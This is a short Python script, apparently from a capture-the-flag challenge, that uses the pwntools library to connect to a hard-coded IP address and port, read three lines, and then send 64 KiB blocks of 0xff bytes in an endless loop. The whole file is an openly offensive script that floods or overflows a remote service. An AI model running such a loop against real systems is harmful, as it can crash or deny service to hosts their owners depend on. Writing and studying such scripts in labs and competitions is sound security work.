from pwnlib.tubes.remote import remote

HOST = "52.9.72.6"
PORT = 35198

with remote(HOST, PORT) as conn:
    conn.recvline()
    conn.recvline()
    conn.recvline()
    while True:
        output = b"\xff" * 65536
        conn.sendline(output)
